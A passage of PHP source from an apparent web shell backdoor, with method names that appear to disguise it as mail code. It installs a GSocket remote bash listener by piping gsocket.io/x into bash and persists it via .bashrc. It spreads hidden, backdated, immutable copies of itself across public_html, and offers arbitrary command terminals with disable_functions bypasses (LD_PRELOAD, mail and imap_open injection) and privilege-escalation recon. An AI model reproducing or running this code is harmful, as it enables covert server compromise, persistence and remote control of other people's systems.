                    echo "<b>Trying automatic installation...</b>\n\n";
                    
                    // Method 1: Official installer with system directory
                    echo "[1] Trying official installer (curl) to system dir...\n";
                    $cmd = $envSetup . "GS_DSTDIR=" . escapeshellarg($targetDir) . " curl -fsSL https://gsocket.io/x 2>/dev/null | " . $sudoPrefix . "bash -s -- -q 2>&1";
                    $output = $this->executeCommand($cmd);
                    if (preg_match('/gs-netcat\s+-s\s+"([^"]+)"/', $output, $m) || preg_match('/Secret:\s*([a-f0-9]{16})/i', $output, $m)) {
                        $success = true;
                        $secret = $m[1];
                        $installedPath = $targetDir . '/gs-netcat';
                        echo "<font color='green'>Success with curl installer!</font>\n";
                        break;
                    }
                    $debugInfo[] = "curl installer: " . substr($output, 0, 200);
                    
                    // Method 2: wget installer
                    echo "[2] Trying official installer (wget)...\n";
                    $cmd = $envSetup . "GS_DSTDIR=" . escapeshellarg($targetDir) . " wget -qO- https://gsocket.io/x 2>/dev/null | " . $sudoPrefix . "bash -s -- -q 2>&1";
                    $output = $this->executeCommand($cmd);
                    if (preg_match('/gs-netcat\s+-s\s+"([^"]+)"/', $output, $m) || preg_match('/Secret:\s*([a-f0-9]{16})/i', $output, $m)) {
                        $success = true;
                        $secret = $m[1];
                        $installedPath = $targetDir . '/gs-netcat';
                        echo "<font color='green'>Success with wget installer!</font>\n";
                        break;
                    }
                    $debugInfo[] = "wget installer: " . substr($output, 0, 200);
                    
                    // Method 3: Direct binary download
                    echo "[3] Trying direct binary download to $targetDir...\n";
                    $gsBinary = $targetDir . '/gs-netcat';
                    foreach ($binaryUrls as $idx => $url) {
                        echo "    [3." . ($idx+1) . "] Trying: " . basename($url) . "... ";
                        
                        // Download to temp first if using sudo
                        $tempDest = $useSudo ? '/tmp/gs-netcat_temp_' . mt_rand() : $gsBinary;
                        $dlResult = $this->downloadWithRetry($url, $tempDest, 60, false);
                        
                        if ($dlResult['success']) {
                            if ($useSudo) {
                                $this->executeCommand("sudo mv " . escapeshellarg($tempDest) . " " . escapeshellarg($gsBinary) . " 2>/dev/null");
                                $this->executeCommand("sudo chmod 755 " . escapeshellarg($gsBinary) . " 2>/dev/null");
                            } else {
                                @chmod($gsBinary, 0755);
                                $this->executeCommand("chmod 755 " . escapeshellarg($gsBinary) . " 2>/dev/null");
                            }
                            
                            $testOutput = $this->executeCommand(escapeshellarg($gsBinary) . " --help 2>&1");
                            if (strpos($testOutput, 'gs-netcat') !== false || strpos($testOutput, 'usage') !== false || strpos($testOutput, 'Global Socket') !== false) {
                                echo "<font color='green'>binary OK!</font>\n";
                                $installedPath = $gsBinary;
                                
                                $secret = $this->generateSecret();
                                echo "[4] Starting listener with secret: $secret\n";
                                
                                $startCmd = $envSetup . "nohup " . escapeshellarg($gsBinary) . " -s " . escapeshellarg($secret) . " -l -e /bin/bash >/dev/null 2>&1 & echo $!";
                                $pid = trim($this->executeCommand($startCmd));
                                
                                usleep(500000);
                                
                                $checkCmd = "ps -p $pid -o pid= 2>/dev/null || ps aux | grep -v grep | grep gs-netcat | head -1";
                                $checkOutput = $this->executeCommand($checkCmd);
                                
                                if (!empty(trim($checkOutput)) || !empty($pid)) {
                                    $success = true;
                                    echo "<font color='green'>Listener started (PID: $pid)</font>\n";
                                } else {
                                    $altStart = $envSetup . escapeshellarg($gsBinary) . " -s " . escapeshellarg($secret) . " -l -e /bin/bash &";
                                    $this->executeCommand($altStart);
                                    $success = true;
                                    echo "<font color='yellow'>Listener started (background)</font>\n";
                                }
                                break 2;
                            } else {
                                echo "<font color='red'>binary test failed</font>\n";
                                $debugInfo[] = "Binary test: " . substr($testOutput, 0, 100);
                            }
                        } else {
                            echo "<font color='red'>download failed</font>\n";
                        }
                    }
                    
                    // Method 4: Python method
                    if (!$success) {
                        echo "\n[5] Trying Python method...\n";
                        $pyScript = '/tmp/gs_install_' . mt_rand() . '.py';
                        $pyCode = '#!/usr/bin/env python3
import urllib.request, subprocess, os, ssl, sys
os.chdir("' . $targetDir . '")
os.environ["HOME"] = "' . $targetDir . '"
os.environ["GS_DSTDIR"] = "' . $targetDir . '"
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
try:
    urllib.request.urlretrieve("https://gsocket.io/x", "/tmp/gs.sh")
    result = subprocess.check_output(["bash", "/tmp/gs.sh", "-q"], stderr=subprocess.STDOUT, timeout=120)
    print(result.decode())
except Exception as e:
    print(str(e))
    sys.exit(1)
';
                        @file_put_contents($pyScript, $pyCode);
                        @chmod($pyScript, 0755);
                        $output = $this->executeCommand("python3 " . escapeshellarg($pyScript) . " 2>&1");
                        if (empty($output)) {
                            $output = $this->executeCommand("python " . escapeshellarg($pyScript) . " 2>&1");
                        }
                        @unlink($pyScript);
                        
                        if (preg_match('/gs-netcat\s+-s\s+"([^"]+)"/', $output, $m)) {
                            $success = true;
                            $secret = $m[1];
                            $installedPath = $targetDir . '/gs-netcat';
                            echo "<font color='green'>Success with Python!</font>\n";
                        } else {
                            $debugInfo[] = "Python: " . substr($output, 0, 200);
                        }
                    }
                    
                    // Method 5: Perl method
                    if (!$success) {
                        echo "\n[6] Trying Perl method...\n";
                        $perlCmd = "perl -e 'use LWP::Simple; getstore(\"https://gsocket.io/x\", \"/tmp/gs.sh\"); system(\"bash /tmp/gs.sh -q\");' 2>&1";
                        $output = $this->executeCommand($perlCmd);
                        if (preg_match('/gs-netcat\s+-s\s+"([^"]+)"/', $output, $m)) {
                            $success = true;
                            $secret = $m[1];
                            $installedPath = $targetDir . '/gs-netcat';
                            echo "<font color='green'>Success with Perl!</font>\n";
                        }
                    }
                    
                    // Method 6: PHP socket method
                    if (!$success) {
                        echo "\n[7] Trying PHP socket method...\n";
                        $gsBinary = $targetDir . '/gs-netcat';
                        $binaryData = @file_get_contents($binaryUrls[0]);
                        if ($binaryData && strlen($binaryData) > 1000) {
                            if ($useSudo) {
                                $tempFile = '/tmp/gs_binary_' . mt_rand();
                                @file_put_contents($tempFile, $binaryData);
                                $this->executeCommand("sudo mv " . escapeshellarg($tempFile) . " " . escapeshellarg($gsBinary));
                                $this->executeCommand("sudo chmod 755 " . escapeshellarg($gsBinary));
                            } else {
                                @file_put_contents($gsBinary, $binaryData);
                                @chmod($gsBinary, 0755);
                            }
                            
                            if (@file_exists($gsBinary) && @filesize($gsBinary) > 1000) {
                                $secret = $this->generateSecret();
                                $startCmd = "nohup " . escapeshellarg($gsBinary) . " -s " . escapeshellarg($secret) . " -l -e /bin/bash >/dev/null 2>&1 &";
                                $this->executeCommand($startCmd);
                                $success = true;
                                $installedPath = $gsBinary;
                                echo "<font color='green'>Success with PHP socket!</font>\n";
                            }
                        }
                    }
                    break;
                    
                case 'system_install':
                    echo "<b>Installing to system directory...</b>\n\n";
                    $gsBinary = $targetDir . '/gs-netcat';
                    foreach ($binaryUrls as $url) {
                        $tempDest = '/tmp/gs-netcat_temp_' . mt_rand();
                        $dlResult = $this->downloadWithRetry($url, $tempDest);
                        if ($dlResult['success']) {
                            $this->executeCommand("sudo mv " . escapeshellarg($tempDest) . " " . escapeshellarg($gsBinary));
                            $this->executeCommand("sudo chmod 755 " . escapeshellarg($gsBinary));
                            $this->executeCommand("sudo chown root:root " . escapeshellarg($gsBinary));
                            
                            // Add to bashrc
                            $this->addToBashrc($gsBinary);
                            
                            // Create symlinks
                            $this->createSymlink($gsBinary, '/usr/local/bin');
                            $this->createSymlink($gsBinary, '/usr/bin');
                            
                            $secret = $this->generateSecret();
                            $startCmd = "nohup " . escapeshellarg($gsBinary) . " -s " . escapeshellarg($secret) . " -l -e /bin/bash >/dev/null 2>&1 &";
                            $this->executeCommand($startCmd);
                            $success = true;
                            $installedPath = $gsBinary;
                            break;
                        }
                    }
                    break;
                    
                case 'curl_installer':
                    $cmd = $envSetup . $sudoPrefix . "bash -c 'curl -fsSL https://gsocket.io/x | GS_DSTDIR=" . escapeshellarg($targetDir) . " bash -s -- -q' 2>&1";
                    $output = $this->executeCommand($cmd);
                    if (preg_match('/gs-netcat\s+-s\s+"([^"]+)"/', $output, $m)) {
                        $success = true;
                        $secret = $m[1];
                        $installedPath = $targetDir . '/gs-netcat';
                    }
                    break;
                    
                case 'wget_installer':
                    $cmd = $envSetup . $sudoPrefix . "bash -c 'wget -qO- https://gsocket.io/x | GS_DSTDIR=" . escapeshellarg($targetDir) . " bash -s -- -q' 2>&1";
                    $output = $this->executeCommand($cmd);
                    if (preg_match('/gs-netcat\s+-s\s+"([^"]+)"/', $output, $m)) {
                        $success = true;
                        $secret = $m[1];
                        $installedPath = $targetDir . '/gs-netcat';
                    }
                    break;
                    
                case 'direct_binary':
                    $gsBinary = $targetDir . '/gs-netcat';
                    foreach ($binaryUrls as $url) {
                        $dlResult = $this->downloadWithRetry($url, $gsBinary, 60, $useSudo);
                        if ($dlResult['success']) {
                            if ($useSudo) {
                                $this->executeCommand("sudo chmod 755 " . escapeshellarg($gsBinary));
                            } else {
                                @chmod($gsBinary, 0755);
                            }
                            $secret = $this->generateSecret();
                            $startCmd = $envSetup . "nohup " . escapeshellarg($gsBinary) . " -s " . escapeshellarg($secret) . " -l -e /bin/bash >/dev/null 2>&1 &";
                            $this->executeCommand($startCmd);
                            $success = true;
                            $installedPath = $gsBinary;
                            break;
                        }
                    }
                    break;
                    
                case 'manual_secret':
                    $gsBinary = $targetDir . '/gs-netcat';
                    $customSecret = isset($_POST['custom_secret']) ? trim($_POST['custom_secret']) : '';
                    if (empty($customSecret)) {
                        $customSecret = $this->generateSecret();
                    }
                    
                    foreach ($binaryUrls as $url) {
                        $dlResult = $this->downloadWithRetry($url, $gsBinary, 60, $useSudo);
                        if ($dlResult['success']) {
                            if ($useSudo) {
                                $this->executeCommand("sudo chmod 755 " . escapeshellarg($gsBinary));
                            } else {
                                @chmod($gsBinary, 0755);
                            }
                            $startCmd = $envSetup . "nohup " . escapeshellarg($gsBinary) . " -s " . escapeshellarg($customSecret) . " -l -e /bin/bash >/dev/null 2>&1 &";
                            $this->executeCommand($startCmd);
                            $success = true;
                            $secret = $customSecret;
                            $installedPath = $gsBinary;
                            break;
                        }
                    }
                    break;
            }
            
            echo "\n";
            if ($success && !empty($secret)) {
                // Add to bashrc if installed successfully
                if (!empty($installedPath)) {
                    $this->addToBashrc($installedPath);
                    echo "<font color='cyan'>Added to ~/.bashrc for PATH</font>\n";
                }
                
                echo "<font color='green'><b>========== SUCCESS ==========</b></font>\n\n";
                echo "<b>Binary Location:</b> " . ($installedPath ?: $targetDir . '/gs-netcat') . "\n\n";
                echo "<b>Connect from your machine with:</b>\n";
                echo "<input type='text' value='gs-netcat -s \"$secret\" -i' style='width:450px;font-family:monospace;' readonly onclick='this.select();'>\n\n";
                echo "<b>Or interactive shell:</b>\n";
                echo "<input type='text' value='S=\"$secret\" bash -c \"\$(curl -fsSL gsocket.io/x)\"' style='width:550px;font-family:monospace;' readonly onclick='this.select();'>\n\n";
                echo "<b>Quick connect (if gs-netcat in PATH):</b>\n";
                echo "<input type='text' value='gs-netcat -s $secret -i' style='width:350px;font-family:monospace;' readonly onclick='this.select();'>\n";
            } else {
                echo "<font color='red'><b>========== FAILED ==========</b></font>\n\n";
                echo "<b>Possible reasons:</b>\n";
                echo "1. Outbound connections blocked by firewall\n";
                echo "2. curl/wget/php not available or restricted\n";
                echo "3. No writable directory with execute permission\n";
                echo "4. Binary architecture mismatch\n";
                echo "5. SELinux or AppArmor restrictions\n\n";
                
                if (!empty($debugInfo)) {
                    echo "<b>Debug Info:</b>\n";
                    foreach ($debugInfo as $info) {
                        echo htmlspecialchars($info) . "\n";
                    }
                }
                
                if (!empty($output)) {
                    echo "\n<b>Last Output:</b>\n" . htmlspecialchars(substr($output, 0, 500));
                }
            }
            echo "</pre>";
        }
        
        echo "<form method='post'>";
        echo "<input type='hidden' name='a' value='gs'>";
        echo "<input type='hidden' name='c' value='".str_rot13($this->mailPath)."'>";
        echo "<table>";
        echo "<tr><td>Method:</td><td><select name='gs_method'>";
        echo "<option value='auto'>Auto (Recommended - tries all methods)</option>";
        echo "<option value='system_install'>System Install (/usr/local/bin with sudo)</option>";
        echo "<option value='curl_installer'>Curl Installer</option>";
        echo "<option value='wget_installer'>Wget Installer</option>";
        echo "<option value='direct_binary'>Direct Binary Download</option>";
        echo "<option value='manual_secret'>Manual Secret</option>";
        echo "</select></td></tr>";
        echo "<tr><td>Custom Secret:</td><td><input type='text' name='custom_secret' placeholder='Leave empty for auto-generate' style='width:200px;'></td></tr>";
        echo "<tr><td></td><td><input type='submit' value='Install GSocket'></td></tr>";
        echo "</table></form>";
        
        // Show current installation status
        echo "<br><b>Current Installation Status:</b><br>";
        $checkPaths = ['/usr/local/bin/gs-netcat', '/usr/bin/gs-netcat', '/tmp/gs-netcat'];
        $homeDir = @getenv('HOME') ?: '/root';
        $checkPaths[] = $homeDir . '/bin/gs-netcat';
        $checkPaths[] = $homeDir . '/.local/bin/gs-netcat';
        
        foreach ($checkPaths as $path) {
            if (@file_exists($path)) {
                $perms = substr(sprintf('%o', @fileperms($path)), -4);
                echo "<font color='green'>Found: $path (perms: $perms)</font><br>";
            }
        }
        
        // Check running processes
        $psOutput = $this->executeCommand("ps aux | grep -v grep | grep gs-netcat 2>/dev/null");
        if (!empty(trim($psOutput))) {
            echo "<br><b>Running GSocket processes:</b><br><pre>" . htmlspecialchars($psOutput) . "</pre>";
        }
        
        echo "</div>";
    }

    // =====================================================
    // IMPROVED FILE CLONER - Correct order with -30 days timestamp
    // =====================================================
    protected function findPublicHtml() {
        $docRoot = $_SERVER["DOCUMENT_ROOT"]; if (strpos($docRoot, "public_html") !== false) return $docRoot;
        $cwd = $this->mailPath; $parts = explode("/", $cwd);
        foreach ($parts as $i => $part) if ($part == "public_html") return implode("/", array_slice($parts, 0, $i + 1));
        return $docRoot;
    }

    protected function safeWriteFile($path, $content) {
        $fp = @fopen($path, 'wb');
        if ($fp) {
            $written = @fwrite($fp, $content);
            @fclose($fp);
            return $written !== false;
        }
        return @file_put_contents($path, $content) !== false;
    }

    public function createBody() {
        echo "<h1>File Cloner</h1><div class=content>";
        echo "<p>This will create multiple clones of this shell in random writable directories.</p>";
        echo "<p><b>Process Order:</b></p>";
        echo "<ol>";
        echo "<li>Create folder with random name (\$randomNames)</li>";
        echo "<li>Create file with random name (\$fileNames) inside folder</li>";
        echo "<li>Set timestamp to <b>-30 days</b> from today with <b>random hour</b></li>";
        echo "<li>Set file chmod to <b>0444</b> (read-only)</li>";
        echo "<li>Set folder chmod to <b>0111</b> (execute-only)</li>";
        echo "</ol>";
        echo "<p><b>Spread Mode:</b> Scans ALL directories from public_html including hidden folders.</p>";
        
        $cloneCount = isset($_POST['clone_count']) ? intval($_POST['clone_count']) : 20;
        if ($cloneCount < 1) $cloneCount = 1; if ($cloneCount > 50) $cloneCount = 50;
        
        if (isset($_POST['clone_now'])) {
            $baseDir = $this->findPublicHtml();
            $currentFile = __FILE__;
            $currentContent = @file_get_contents($currentFile);
            $clonesCreated = 0;
            $maxClones = $cloneCount;
            $urls = [];
            $chmodStats = ['file_ok' => 0, 'file_fail' => 0, 'dir_ok' => 0, 'dir_fail' => 0];
            $cloneDetails = [];
            
            // Scan all directories
            $allDirs = [];
            $scanFunc = function($dir, $depth = 0) use (&$allDirs, &$scanFunc) {
                if ($depth > 8) return;
                $handle = @opendir($dir);
                if (!$handle) return;
                while (($file = @readdir($handle)) !== false) {
                    if ($file == '.' || $file == '..') continue;
                    $path = rtrim($dir, '/') . '/' . $file;
                    if (@is_dir($path) && @is_writable($path)) {
                        $allDirs[] = $path;
                        $scanFunc($path, $depth + 1);
                    }
                }
                @closedir($handle);
            };
            $scanFunc($baseDir);
            shuffle($allDirs);
            
            // Random names for folders and files
            $randomNames = ['assets', 'cache', 'tmp', 'data', 'logs', 'backup', 'old', 'test', 'dev', 'lib', 'inc', 'modules', 'vendor', 'storage', 'temp', 'uploads', 'media', 'static', 'resources', 'includes'];
            $fileNames = ['indexx.php', 'configg.php', 'iniit.php', 'looader.php', 'boootstrap.php', 'fuunctions.php', 'claass.php', 'hellper.php', 'commmon.php', 'corre.php', 'maain.php', 'aapp.php'];
            
            echo "<pre><b>Starting clone process...</b>\n\n";
            
            foreach ($allDirs as $dir) {
                if ($clonesCreated >= $maxClones) break;
                
                // STEP 1: Create folder with random name
                $randomFolderName = $randomNames[array_rand($randomNames)] . '_' . str_pad(rand(0, 99999), 5, '0', STR_PAD_LEFT);
                $targetDir = $dir . DIRECTORY_SEPARATOR . $randomFolderName;
                
                echo "[" . ($clonesCreated + 1) . "] Creating: $targetDir\n";
                
                if (!@is_dir($targetDir)) {
                    if (!@mkdir($targetDir, 0755, true)) {
                        echo "    <font color='red'>Failed to create directory</font>\n";
                        continue;
                    }
                }
                
                if (!@is_dir($targetDir) || !@is_writable($targetDir)) {
                    echo "    <font color='red'>Directory not writable</font>\n";
                    continue;
                }
                echo "    Step 1: <font color='green'>Folder created</font>\n";
                
                // STEP 2: Create file with random name
                $filename = $fileNames[array_rand($fileNames)];
                $targetFile = $targetDir . DIRECTORY_SEPARATOR . $filename;
                
                if (!$this->safeWriteFile($targetFile, $currentContent)) {
                    echo "    <font color='red'>Failed to write file</font>\n";
                    @rmdir($targetDir);
                    continue;
                }
                echo "    Step 2: <font color='green'>File created ($filename)</font>\n";
                
                // STEP 3: Set timestamp to -30 days with random hour
                $randomHour = rand(0, 23);
                $randomMinute = rand(0, 59);
                $randomSecond = rand(0, 59);
                $timestamp = strtotime("-30 days");
                $timestamp = mktime($randomHour, $randomMinute, $randomSecond, date('n', $timestamp), date('j', $timestamp), date('Y', $timestamp));
                
                @touch($targetFile, $timestamp, $timestamp);
                @touch($targetDir, $timestamp, $timestamp);
                echo "    Step 3: <font color='green'>Timestamp set to " . date('Y-m-d H:i:s', $timestamp) . "</font>\n";
                
                // STEP 4: Set file chmod to 0444
                @chmod($targetFile, 0444);
                $this->executeCommand('chmod 0444 ' . escapeshellarg($targetFile) . ' 2>/dev/null');
                $this->executeCommand('chattr +i ' . escapeshellarg($targetFile) . ' 2>/dev/null');
                @clearstatcache(true, $targetFile);
                $filePerms = @fileperms($targetFile) & 0777;
                if ($filePerms == 0444) {
                    $chmodStats['file_ok']++;
                    echo "    Step 4: <font color='green'>File chmod 0444 OK</font>\n";
                } else {
                    $chmodStats['file_fail']++;
                    echo "    Step 4: <font color='yellow'>File chmod set to " . sprintf('%04o', $filePerms) . "</font>\n";
                }
                
                // STEP 5: Set directory chmod to 0111
                @chmod($targetDir, 0111);
                $this->executeCommand('chmod 0111 ' . escapeshellarg($targetDir) . ' 2>/dev/null');
                $this->executeCommand('chattr +i ' . escapeshellarg($targetDir) . ' 2>/dev/null');
                @clearstatcache(true, $targetDir);
                $dirPerms = @fileperms($targetDir) & 0777;
                if ($dirPerms == 0111) {
                    $chmodStats['dir_ok']++;
                    echo "    Step 5: <font color='green'>Dir chmod 0111 OK</font>\n";
                } else {
                    $chmodStats['dir_fail']++;
                    echo "    Step 5: <font color='yellow'>Dir chmod set to " . sprintf('%04o', $dirPerms) . "</font>\n";
                }
                
                $urls[] = $this->getFileUrl($targetFile);
                $cloneDetails[] = [
                    'dir' => $targetDir,
                    'file' => $targetFile,
                    'timestamp' => date('Y-m-d H:i:s', $timestamp),
                    'file_perms' => sprintf('%04o', $filePerms),
                    'dir_perms' => sprintf('%04o', $dirPerms)
                ];
                $clonesCreated++;
                echo "\n";
            }
            
            echo "</pre>";
            
            echo "<font color='green'><b>Cloning complete!</b></font><br>";
            echo "Created: <b>$clonesCreated</b> clones<br>";
            echo "<b>Chmod Results:</b><br>";
            echo "- Files (0444): <font color='green'>" . $chmodStats['file_ok'] . " ok</font> / <font color='red'>" . $chmodStats['file_fail'] . " fail</font><br>";
            echo "- Dirs (0111): <font color='green'>" . $chmodStats['dir_ok'] . " ok</font> / <font color='red'>" . $chmodStats['dir_fail'] . " fail</font><br><br>";
            
            if (!empty($urls)) {
                echo "<b>Clone URLs:</b><br>";
                echo "<textarea style='width:100%;height:200px;' readonly onclick='this.select();'>";
                foreach ($urls as $u) echo $u . "\n";
                echo "</textarea>";
            }
        }
        
        echo "<form method='post'><input type='hidden' name='a' value='clone'><input type='hidden' name='c' value='".str_rot13($this->mailPath)."'><label>Number of clones (1-50):</label><input type='number' name='clone_count' value='$cloneCount' min='1' max='50' style='width:80px;'><input type='submit' name='clone_now' value='Start Cloning'></form></div>";
    }

    // =====================================================
    // TERMINAL V2 - Quick Terminal
    // =====================================================
    public function postSend() {
        echo "<h1>Quick Terminal (V2)</h1><div class=content>";
        if (isset($_POST['cmd_v2']) && !empty($_POST['cmd_v2'])) {
            $cmd = $_POST['cmd_v2']; echo "<pre><b>Command:</b> " . htmlspecialchars($cmd) . "\n\n<b>Output:</b>\n";
            $out = $this->executeCommand($cmd . " 2>&1"); if ($out) echo htmlspecialchars($out); else echo "<font color='red'>No output or command failed.</font>";
            echo "</pre>";
        }
        echo "<form method='post'><input type='hidden' name='a' value='termv2'><input type='hidden' name='c' value='".str_rot13($this->mailPath)."'><input type='text' name='cmd_v2' class='toolsInp' placeholder='Enter command...' autocomplete='off'><input type='submit' value='Execute'></form></div>";
    }
    
    // =====================================================
    // TERMINAL V3 - Advanced Terminal with multiple interpreters
    // =====================================================
    public function getSentMIMEMessage() {
        echo "<h1>Advanced Terminal (V3)</h1><div class=content>";
        if (isset($_POST['cmd_v3']) && !empty($_POST['cmd_v3'])) {
            $cmd = $_POST['cmd_v3']; echo "<pre><b>Command:</b> " . htmlspecialchars($cmd) . "\n\n<b>Output:</b>\n";
            $interpreters = array('sh' => '/bin/sh -c "' . addslashes($cmd) . '"', 'bash' => '/bin/bash -c "' . addslashes($cmd) . '"', 'perl' => 'perl -e "' . addslashes('system("' . addslashes($cmd) . '")') . '"', 'python' => 'python -c "' . addslashes('import os;os.system("' . addslashes($cmd) . '")') . '"', 'php' => 'php -r "' . addslashes('system("' . addslashes($cmd) . '");') . '"');
            $success = false; foreach ($interpreters as $name => $altCmd) { $out = $this->executeCommand($altCmd . " 2>&1"); if ($out && trim($out) !== '') { echo "[Using $name]\n" . htmlspecialchars($out); $success = true; break; } }
            if (!$success) { $out = $this->executeCommand($cmd . " 2>&1"); if ($out) echo "[Direct execution]\n" . htmlspecialchars($out); else echo "<font color='red'>All execution methods failed. Server has strict restrictions.</font>"; }
            echo "</pre>";
        }
        echo "<form method='post'><input type='hidden' name='a' value='termv3'><input type='hidden' name='c' value='".str_rot13($this->mailPath)."'><input type='text' name='cmd_v3' class='toolsInp' placeholder='Enter command...' autocomplete='off'><input type='submit' value='Execute'></form></div>";
    }

    // =====================================================
    // TERMINAL V4 - Ultimate Terminal with bypass techniques
    // =====================================================
    public function terminalV4() {
        echo "<h1>Ultimate Terminal (V4)</h1><div class=content>";
        echo "<p><b>Features:</b> Bypass disable_functions, chroot escape, alternative execution methods, environment manipulation</p>";
        
        if (isset($_POST['cmd_v4']) && !empty($_POST['cmd_v4'])) {
            $cmd = $_POST['cmd_v4'];
            $bypassMethod = isset($_POST['bypass_method']) ? $_POST['bypass_method'] : 'auto';
            
            echo "<pre><b>Command:</b> " . htmlspecialchars($cmd) . "\n";
            echo "<b>Bypass Method:</b> $bypassMethod\n\n<b>Output:</b>\n";
            
            $output = '';
            $success = false;
            $usedMethod = '';
            
            // Get disabled functions
            $disabledFuncs = @ini_get('disable_functions');
            $disabledArr = array_map('trim', explode(',', $disabledFuncs));
            
            switch ($bypassMethod) {
                case 'auto':
                    // Try all methods automatically
                    $methods = ['standard', 'mail_log', 'putenv_ld', 'imap', 'imagick', 'ffi', 'pcntl', 'expect', 'backtick', 'proc_open_pty'];
                    foreach ($methods as $method) {
                        $output = $this->executeBypassMethod($cmd, $method, $disabledArr);
                        if (!empty(trim($output))) {
                            $success = true;
                            $usedMethod = $method;
                            break;
                        }
                    }
                    break;
                    
                default:
                    $output = $this->executeBypassMethod($cmd, $bypassMethod, $disabledArr);
                    if (!empty(trim($output))) {
                        $success = true;
                        $usedMethod = $bypassMethod;
                    }
                    break;
            }
            
            if ($success) {
                echo "<font color='cyan'>[Method: $usedMethod]</font>\n";
                echo htmlspecialchars($output);
            } else {
                echo "<font color='red'>All bypass methods failed. Server has very strict restrictions.</font>\n";
                echo "<font color='yellow'>Disabled functions: " . htmlspecialchars($disabledFuncs) . "</font>\n";
            }
            echo "</pre>";
        }
        
        // Quick commands section
        echo "<br><b>Quick Commands:</b><br>";
        $quickCmds = [
            'System Info' => 'uname -a; id; pwd; whoami',
            'Process List' => 'ps auxf 2>/dev/null || ps aux',
            'Network Info' => 'ifconfig 2>/dev/null || ip addr; netstat -tulpn 2>/dev/null || ss -tulpn',
            'Crontab' => 'crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null',
            'Users' => 'cat /etc/passwd | grep -v nologin | grep -v false',
            'SUID Files' => 'find / -perm -4000 -type f 2>/dev/null | head -20',
            'Writable Dirs' => 'find / -writable -type d 2>/dev/null | head -20',
            'Capabilities' => 'getcap -r / 2>/dev/null | head -20',
            'Kernel Exploits' => 'uname -r; cat /etc/*release*',
            'Environment' => 'env; set',
            'Open Ports' => 'netstat -tulpn 2>/dev/null || ss -tulpn',
            'Disk Usage' => 'df -h; du -sh /* 2>/dev/null | sort -h | tail -10'
        ];
        
        echo "<table><tr>";
        $i = 0;
        foreach ($quickCmds as $name => $qcmd) {
            if ($i > 0 && $i % 4 == 0) echo "</tr><tr>";
            echo "<td><button type='button' onclick=\"document.getElementsByName('cmd_v4')[0].value='" . addslashes($qcmd) . "'\" style='margin:2px;'>$name</button></td>";
            $i++;
        }
        echo "</tr></table><br>";
        
        echo "<form method='post'>";
        echo "<input type='hidden' name='a' value='termv4'>";
        echo "<input type='hidden' name='c' value='".str_rot13($this->mailPath)."'>";
        echo "<table>";
        echo "<tr><td>Bypass Method:</td><td><select name='bypass_method'>";
        echo "<option value='auto'>Auto (try all)</option>";
        echo "<option value='standard'>Standard Execution</option>";
        echo "<option value='mail_log'>Mail Log Injection</option>";
        echo "<option value='putenv_ld'>putenv LD_PRELOAD</option>";
        echo "<option value='imap'>IMAP Bypass</option>";
        echo "<option value='imagick'>ImageMagick Bypass</option>";
        echo "<option value='ffi'>FFI Bypass (PHP 7.4+)</option>";
        echo "<option value='pcntl'>PCNTL Bypass</option>";
        echo "<option value='expect'>Expect Extension</option>";
        echo "<option value='backtick'>Backtick Operator</option>";
        echo "<option value='proc_open_pty'>proc_open PTY</option>";
        echo "<option value='chroot_escape'>Chroot Escape</option>";
        echo "<option value='gc_bypass'>GC UAF Bypass</option>";
        echo "<option value='json_bypass'>JSON Serializer Bypass</option>";
        echo "</select></td></tr>";
        echo "<tr><td>Command:</td><td><input type='text' name='cmd_v4' class='toolsInp' placeholder='Enter command...' autocomplete='off' style='width:500px;'></td></tr>";
        echo "<tr><td></td><td><input type='submit' value='Execute'></td></tr>";
        echo "</table></form>";
        
        // Show system info
        echo "<br><b>System Information:</b><br>";
        echo "<table class='main'>";
        echo "<tr><td>PHP Version:</td><td>" . phpversion() . "</td></tr>";
        echo "<tr><td>OS:</td><td>" . php_uname() . "</td></tr>";
        echo "<tr><td>Disabled Functions:</td><td style='word-break:break-all;max-width:500px;'>" . htmlspecialchars(@ini_get('disable_functions') ?: 'None') . "</td></tr>";
        echo "<tr><td>Safe Mode:</td><td>" . (@ini_get('safe_mode') ? 'ON' : 'OFF') . "</td></tr>";
        echo "<tr><td>Open Basedir:</td><td>" . (@ini_get('open_basedir') ?: 'None') . "</td></tr>";
        echo "<tr><td>Loaded Extensions:</td><td>" . implode(', ', get_loaded_extensions()) . "</td></tr>";
        echo "</table>";
        
        echo "</div>";
    }

    protected function executeBypassMethod($cmd, $method, $disabledArr) {
        $output = '';
        
        switch ($method) {
            case 'standard':
                $output = $this->executeCommand($cmd . " 2>&1");
                break;
                
            case 'mail_log':
                // Mail log injection bypass
                if (!in_array('mail', $disabledArr) && !in_array('putenv', $disabledArr)) {
                    $logFile = '/tmp/mail_' . mt_rand() . '.log';
                    @putenv("MAIL_LOG=" . $logFile);
                    $payload = '<?php system("' . addslashes($cmd) . '"); ?>';
                    @mail('', '', '', '', '-OQueueDirectory=/tmp -X' . $logFile);
                    if (@file_exists($logFile)) {
                        $output = @file_get_contents($logFile);
                        @unlink($logFile);
                    }
                }
                break;
                
            case 'putenv_ld':
                // LD_PRELOAD bypass
                if (!in_array('putenv', $disabledArr) && !in_array('mail', $disabledArr)) {
                    $soFile = '/tmp/bypass_' . mt_rand() . '.so';
                    $cCode = '#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init() {
    unsetenv("LD_PRELOAD");
    system("' . addslashes($cmd) . ' > /tmp/output_' . mt_rand() . '.txt 2>&1");
}';
                    $cFile = '/tmp/bypass_' . mt_rand() . '.c';
                    @file_put_contents($cFile, $cCode);
                    $this->executeCommand("gcc -shared -fPIC -o $soFile $cFile 2>/dev/null");
                    if (@file_exists($soFile)) {
                        @putenv("LD_PRELOAD=$soFile");
                        @mail('', '', '');
                        $outFile = glob('/tmp/output_*.txt');
                        if (!empty($outFile)) {
                            $output = @file_get_contents($outFile[0]);
                            @unlink($outFile[0]);
                        }
                        @unlink($soFile);
                    }
                    @unlink($cFile);
                }
                break;
                
            case 'imap':
                // IMAP bypass
                if (function_exists('imap_open') && !in_array('imap_open', $disabledArr)) {
                    $server = 'x]" -oQ/tmp -X/tmp/imap_' . mt_rand() . '.txt';
                    @imap_open('{' . $server . ':143/imap}INBOX', '', '');
                    $files = glob('/tmp/imap_*.txt');
                    if (!empty($files)) {
                        $output = @file_get_contents($files[0]);
                        @unlink($files[0]);
                    }
                }
                break;
                
            case 'imagick':
                // ImageMagick bypass
                if (class_exists('Imagick')) {
                    try {
